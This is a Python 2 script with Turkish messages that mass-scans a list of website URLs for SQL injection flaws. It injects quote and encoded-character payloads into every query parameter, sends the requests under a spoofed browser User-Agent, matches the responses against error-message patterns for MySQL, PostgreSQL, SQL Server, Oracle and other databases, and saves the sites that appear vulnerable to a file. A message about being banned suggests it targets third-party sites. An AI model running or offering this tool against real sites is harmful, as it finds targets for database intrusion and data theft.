import datetime
import requests
import ssl
import sys
import os
import re
class renkler:
    HEADER = '\033[95m'
    mavi = '\033[94m'
    yesil = '\033[92m'
    sari = '\033[93m'
    kirmizi = '\033[91m'
    beyaz = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
def gecen(baslangic, bitis):
    sonuc = bitis - baslangic
    d= str(sonuc).split(":")
    dd= d[0]+":"+d[1]+":"+d[2][0:2]
    print renkler.sari+"Program islemi   %s' surede bitirmistir."%(dd)+renkler.beyaz
print ("""
####################################
# Coder: Cüneyt TANRISEVER         #
# Parametrelere sql denemesi yapar #
####################################
""")
baslangic= datetime.datetime.now()
dosya=open("sqlaciklisiteler.txt","w")
dosya.close()
kaynak=[]
karsilastirma=[]
sayicik =0
sonduzen=[]
headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.28 Safari/537.36' }
rq=requests.session()
rq.headers.update(headers)

db = {
"MySQL": (r"SQL syntax.*MySQL", r"Warning.*mysql_.*", r"valid MySQL result", r"MySqlClient\."),
"PostgreSQL": (r"PostgreSQL.*ERROR", r"Warning.*\Wpg_.*", r"valid PostgreSQL result", r"Npgsql\."),
"Microsoft SQL Server": (r"Driver.* SQL[\-\_\ ]*Server", r"OLE DB.* SQL Server", r"(\W|\A)SQL Server.*Driver", r"Warning.*mssql_.*", r"(\W|\A)SQL Server.*[0-9a-fA-F]{8}", r"(?s)Exception.*\WSystem\.Data\.SqlClient\.", r"(?s)Exception.*\WRoadhouse\.Cms\."),
"Microsoft Access": (r"Microsoft Access Driver", r"JET Database Engine", r"Access Database Engine"),
"Oracle": (r"\bORA-[0-9][0-9][0-9][0-9]", r"Oracle error", r"Oracle.*Driver", r"Warning.*\Woci_.*", r"Warning.*\Wora_.*"),
"IBM DB2": (r"CLI Driver.*DB2", r"DB2 SQL error", r"\bdb2_\w+\("),
"SQLite": (r"SQLite/JDBCDriver", r"SQLite.Exception", r"System.Data.SQLite.SQLiteException", r"Warning.*sqlite_.*", r"Warning.*SQLite3::", r"\[SQLITE_ERROR\]"),
"Sybase": (r"(?i)Warning.*sybase.*", r"Sybase message", r"Sybase.*Server message.*"),
}
urlgir=raw_input("url dosyasini giriniz. = ")
print renkler.mavi+"\nSql Taramasi Basladi..."+renkler.beyaz

urlcek=open(urlgir,"r").readlines()
b=[]
    
for uy in urlcek:
    
    urlc=uy.replace("\n","")
    sqlhata = ("'", "'Q", "')", "';", '"', '")', '";', '`', '`)', '`;', '\\', "%27", "%%2727", "%25%27", "%60", "%5C")
    sayicik +=1
    sys.stdout.write('\r')
    sys.stdout.write( str(sayicik)+'. siradaki url deneniyor... ')
    sys.stdout.flush()
    for payd in sqlhata:
        try:
            pk=payd+"&"
            ur=urlc.replace("&",pk)
            url= ur+payd
            res=rq.get(url,timeout=10).content
            for db1, hatalar in db.items():
                for hata in hatalar:
                    if re.compile(hata).search(res): 
                        print renkler.yesil+"\nsql acikli site = "+renkler.sari+db1+renkler.beyaz+" ", renkler.kirmizi+url+renkler.beyaz
                        bingcom=open("sqlaciklisiteler.txt","a")
                        bingcom.write(url+"\n")
                        bingcom.close()
                        b.append("1")
                        break
                    else:
                        pass
    
    
        except requests.exceptions.ConnectionError:
            print renkler.kirmizi+"\n boyle bir site yok ve ya ban yedin diye baglanmadi"+renkler.beyaz
            continue
        except requests.exceptions.Timeout:
            print renkler.kirmizi+"\nzaman asimi olustu bu url atlandi."+renkler.beyaz
            continue
        except requests.exceptions.TooManyRedirects:
            print renkler.kirmizi+"\n 20 sndir cevap alinmadi. zaman asimi olustu bu url atlandi"+renkler.beyaz
            continue
        except IOError:
            continue;
        if b != []:
           b=[]
           break
bingcom=open("sqlaciklisiteler.txt","r").readlines()
bing=open("sqlaciklisiteler.txt","w")
bing.close()
for ks in bingcom:
    df=ks.replace("\n","")
    kaynak.append(df)
for i in kaynak:
    karsilastirma.append(i)
for i in karsilastirma:
    if sonduzen.count(i)==0:
        sonduzen.append(i)
for i in sonduzen:
    bingcom=open("sqlaciklisiteler.txt","a")
    bingcom.write(i+"\n")
    bingcom.close()
kaynak=[]
karsilastirma=[]
sonduzen=[]
 
bitis= datetime.datetime.now()
gecen(baslangic,bitis)
print renkler.yesil+"\n------ Sonuclar sqlaciklisiteler.txt kayit edildi ------"+renkler.beyaz
